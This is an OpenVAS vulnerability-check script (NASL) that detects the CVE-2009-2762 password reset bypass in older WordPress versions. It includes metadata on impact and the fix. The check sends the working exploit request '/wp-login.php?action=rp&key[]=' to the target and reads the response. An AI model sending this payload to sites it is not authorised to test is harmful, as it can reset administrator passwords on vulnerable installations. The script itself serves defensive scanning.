###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_sec_bypass_vuln.nasl 5148 2017-01-31 13:16:55Z teissa $
#
# WordPress wp-login.php Security Bypass Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Attackers can exploit this issue to bypass security restrictions and change
  the administrative password.
  Impact Level: Application";
tag_affected = "WordPress version prior to 2.8.4 on all running platform.";
tag_insight = "The flaw is due to an error in the wp-login.php script password reset
  mechanism which can be exploited by passing an array variable in a resetpass
  (aka rp) action.";
tag_solution = "Update to Version 2.8.4
  http://wordpress.org/download/";
tag_summary = "The host is running WordPress and is prone to Security Bypass
  vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.900913";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5148 $");
  script_tag(name:"last_modification", value:"$Date: 2017-01-31 14:16:55 +0100 (Tue, 31 Jan 2017) $");
  script_tag(name:"creation_date", value:"2009-08-20 09:27:17 +0200 (Thu, 20 Aug 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2762");
  script_bugtraq_id(36014);
  script_name("WordPress wp-login.php Security Bypass Vulnerability");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9410");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/52382");
  script_xref(name : "URL" , value : "http://wordpress.org/development/2009/08/2-8-4-security-release/");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("host_details.inc");


# Get for WordPress Default Port
wpPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!wpPort){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:wpPort))exit(0);

sndReq = http_get(item:string(dir, "/wp-login.php?action=rp&key[]="),
                  port:wpPort);
rcvRes = http_send_recv(port:wpPort, data:sndReq);

if("checkemail=newpass" >< rcvRes)
{
  security_message(wpPort);
  exit(0);
}
